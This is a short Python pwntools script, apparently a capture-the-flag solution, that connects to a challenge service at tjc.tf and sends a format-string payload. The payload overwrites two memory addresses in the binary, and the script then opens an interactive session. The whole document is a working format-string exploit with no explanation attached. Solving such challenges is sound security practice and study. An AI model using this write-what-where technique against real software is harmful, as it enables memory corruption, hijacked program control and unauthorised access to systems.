from pwn import *

context.binary = exe = ELF('./chall')

io = remote('tjc.tf', 31764)
#gdb.attach(io, api=True)
io.recvuntil(b'else): ')

payload = fmtstr_payload(6, {0x403440:0x403560, 0x403560:0x86A693E-2})
io.sendline(payload)
io.interactive()